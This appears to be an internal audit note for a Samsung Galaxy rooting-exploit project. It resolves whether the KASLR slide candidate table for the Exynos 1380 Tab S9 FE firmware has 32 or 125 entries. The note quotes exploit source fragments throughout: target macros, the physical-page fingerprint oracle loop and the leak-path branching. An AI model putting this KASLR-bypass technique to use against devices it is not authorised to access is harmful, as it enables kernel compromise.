# Technical Errata and Resolution: P0 Candidate Space (32 vs 125) in ZG3

- **Device**: Samsung Galaxy Tab S9 FE Wi-Fi (`SM-X510` / `gts9fewifi`)
- **SoC**: Samsung Exynos 1380 (`s5e8835`)
- **Audited Branch**: `hmd-msrf-k/Root-My-Galaxy-Payloads` @ `gts9fewifi-X510XXSEEZG3-v4`
- **Date**: 2026-09-06
- **Formal Audit Result**: **`TWO_DISTINCT_CANDIDATE_SPACES`**

---

## 1. Nature of the Apparent Contradiction

In prior audit phases an inconsistency between two document sources was detected:
1. In `docs/rmg-eze4/zg3_target_inventory_v2.csv` (row 181) and `target.h:72-80`, macro `SLIDE_P0_OFFSET_CANDIDATES` was listed containing **32 values** spaced by `0x10000` (64 KB) and described `p0_fingerprints` as an *"array [32 entries]"*.
2. In `docs/rmg-eze4/PHASE3A.md` and `p0_oracle_algorithm.md`, it was demonstrated that the `gts9fewifi` target mandatorily requires a 16 KB (`0x4000`) KASLR step, resulting in **125 candidates** for the 2 MB (`0x1f0000`) probe window.

This audit exclusively analyzes real source code from the production branch to conclusively resolve this divergence.

---

## 2. Exact Source Code Quotes

### 2.1 Macro `SLIDE_KASLR_STEP`
Location: `src/targets/gts9fewifi-X510XXSEEZG3/target.h:82`
```c
#define SLIDE_KASLR_STEP 0x4000ULL
```

### 2.2 Macro `SLIDE_P0_OFFSET_CANDIDATES`
Location: `src/targets/gts9fewifi-X510XXSEEZG3/target.h:72-80`
```c
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
```
*(Contains exactly 32 values with 0x10000 step).*

### 2.3 Real Number of Entries in `p0_fingerprints[]`
Location: `src/targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h:17-518`
- Explanatory header (`p0_fingerprint.h:2`):
  ```c
  // 0x4000 step fingerprint table.
  ```
- First entry (`p0_fingerprint.h:18-21`):
  ```c
  { 0x000000ULL, { 0xf835013fd53cd04aULL, 0xf90002e8f9407a68ULL, ... } },
  ```
- Second entry (`p0_fingerprint.h:22-25`):
  ```c
  { 0x004000ULL, { 0xa90357f6a9025ff8ULL, 0x943d785cb5fff9c8ULL, ... } },
  ```
- Last entry (`p0_fingerprint.h:514-517`):
  ```c
  { 0x1f0000ULL, { 0x1487bffffa405a4dULL, 0xd503201fd503201fULL, ... } },
  ```
- **Real count**: Exactly **125 entries** of type `struct p0_fingerprint`.

### 2.4 Macros Determining the Number of Fingerprints
- No explicit preprocessor macro of type `#define P0_FINGERPRINT_ROWS 125` exists.
- The header is dynamically included via:
  `src/targets/gts9fewifi-X510XXSEEZG3/target.h:64-65`:
  ```c
  #define P0_FINGERPRINT_HEADER \
    "targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h"
  ```
- At compile and run time, table size is determined via C `sizeof` operator:
  `src/oracle.c:248-250`:
  ```c
  for (size_t index = 0;
       index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
       index++)
  ```

---

## 3. Execution Flow Tracing: `target.h` $\rightarrow$ `oracle.c`

Inspecting the exploit source code in `src/slide_app.c` and `src/oracle.c` reveals how these two spaces coexist:

### 3.1 Conditional Branching in `slide_app.c`
In `src/slide_app.c:15-20`:
```c
#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
    (!defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif
```
**Critical effect**: The array `slide_p0_offsets[]` (the 32 candidates of `SLIDE_P0_OFFSET_CANDIDATES`) **IS COMPILED ONLY** if `PHYS_P0_ORACLE` is 0 or undefined.

Given that in `target.h:8`:
```c
#define PHYS_P0_ORACLE 1
```
The array `slide_p0_offsets[]` is **completely excluded from compilation** in the active suite.

### 3.2 KASLR Leak Mechanism Selection
In `src/slide_app.c:887-938`:
```c
int slide_leak_kernel_base(void) {
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    ...
  }
  return slide_leak_physical_base();
#else
  // Legacy branch (legacy non-P0 pselect/sysctl leak)
  ...
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    slide_p0_offset = slide_p0_offsets[
        (size_t)(attempt - 1) %
        (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
    ...
  }
#endif
}
```

### 3.3 Loop in `src/oracle.c` (Active Production Route)
1. `slide_leak_physical_base()` calls `scan_p0_pipe_oracle()` in `src/oracle.c`.
2. In `src/oracle.c:248-259`:
   ```c
   for (size_t index = 0;
        index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
        index++) {
     int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
     if (score > best_score) {
       second_score = best_score;
       best_score = score;
       best_slide = p0_fingerprints[index].slide;
     } else if (score > second_score) {
       second_score = score;
     }
   }
   ```
- **Runtime iterating array**: `p0_fingerprints[]` (defined in `p0_fingerprint.h`).
- **Number of traversed entries**: $\frac{\text{sizeof}(p0\_fingerprints)}{\text{sizeof}(p0\_fingerprints[0])} = \mathbf{125 \text{ entries}}$.
- **What each candidate represents**: A concrete KASLR offset $\text{slide} \in [0, \text{0x1f0000}]$ evaluated at 16 KB (`0x4000`) intervals, associated with 8 64-bit QWORD samples of the physical image.

---

## 4. Rigorous Programmatic Count

A deterministic regular expression parser was executed over `src/targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h`:

```python
import re
with open("src/targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h") as f:
    text = f.read()

pattern = re.compile(r'\{\s*(0x[0-9a-fA-F]+)ULL\s*,\s*\{\s*([^}]+)\s*\}\s*\}')
matches = pattern.findall(text)
slides = [int(m[0], 16) for m in matches]
diffs = [slides[i+1] - slides[i] for i in range(len(slides)-1)]

print(f"Total entries: {len(matches)}")
print(f"First slide:   {hex(slides[0])}")
print(f"Last slide:    {hex(slides[-1])}")
print(f"Step size:     {[hex(d) for d in set(diffs)]}")
```

**Obtained output**:
```
Total entries: 125
First slide:   0x0
Last slide:    0x1f0000
Step size:     ['0x4000']
```

Additionally, all repository targets were inspected, revealing total architectural segregation:
- **Qualcomm / Exynos 2400 / MediaTek devices** (64 KB KASLR step):
  - `e1s`, `e2s`, `e3q`, `dm3q`, `pa3q`, `q7q`, `a15`, `a36xq`, `essi`: **32 entries** (`step=0x10000`).
- **Samsung Exynos 1380 (`s5e8835`) devices** (16 KB KASLR step):
  - `a54x-A546EXXSKFZF4`: **125 entries** (`step=0x4000`).
  - `a54x-A546BXXSLFZG3`: **125 entries** (`step=0x4000`).
  - `gts9fewifi-X510XXSEEZG3`: **125 entries** (`step=0x4000`).

---

## 5. Discrepancy Explanation and Origin of Error in Inventory

There are **two conceptually and functionally distinct candidate spaces** in the Root-My-Galaxy codebase:

1. **Space 1: In-Memory P0 Physical Oracle (`PHYS_P0_ORACLE == 1`) — [ACTIVE IN PRODUCTION]**:
   - Resides in: `src/targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h`.
   - Used by: `src/oracle.c:scan_p0_pipe_oracle()`.
   - Geometry: **125 candidates** spaced by **`0x4000`** (16 KB).
   - Generated by: `tools/generate_p0_fingerprint.pl` which reads `#define SLIDE_KASLR_STEP 0x4000ULL` from `target.h`.
   - This is the real space with which the exploit obtained root on attempt 1/8 in commit `b7a854e`.

2. **Space 2: Legacy Brute-Force Sampling for pselect (`!PHYS_P0_ORACLE`) — [INACTIVE / RESIDUAL]**:
   - Resides in: Macro `SLIDE_P0_OFFSET_CANDIDATES` in `target.h:72-80`.
   - Geometry: **32 candidates** spaced by **`0x10000`** (64 KB).
   - Exclusively used in compilation branch `#else` of `src/slide_app.c:15-20` and `887-938`.
   - Remains dead code when `PHYS_P0_ORACLE == 1`.

### Root Cause of Error in `zg3_target_inventory_v2.csv`
In row 181 of initial inventory:
```csv
p0_fingerprints,struct p0_fingerprint array [32 entries],p0_fingerprint.h,17,FIRMWARE_FINGERPRINT,DISASSEMBLY,Lookup table of 32 physical page candidate samples from Image
```
The inventory author hastily transcribed `"32 entries"` erroneously assuming table `p0_fingerprints[]` corresponded to the value of `SLIDE_MAX_ATTEMPTS 32` or the 32 elements of macro `SLIDE_P0_OFFSET_CANDIDATES`, **without counting the actual lines of `p0_fingerprint.h`** (which has 521 lines and 125 structures).

---

## 6. Formal Conclusion

The formal result of this technical verification is unequivocal:

$$\mathbf{TWO\_DISTINCT\_CANDIDATE\_SPACES}$$

1. In the active production runtime of `gts9fewifi-X510XXSEEZG3`, the physical P0 oracle iterates and evaluates exclusively the **125 candidates at 0x4000 step** defined in `p0_fingerprint.h`.
2. The `SLIDE_P0_OFFSET_CANDIDATES` macro with 32 candidates at `0x10000` step corresponds to the alternative route `!PHYS_P0_ORACLE`, inactive under `PHYS_P0_ORACLE 1`.
3. Therefore, the statement in `PHASE3A.md` is **STRICTLY CORRECT**: for Exynos 1380 / Tab S9 FE, the physical P0 oracle requires a table of **125 entries with 0x4000 step**.
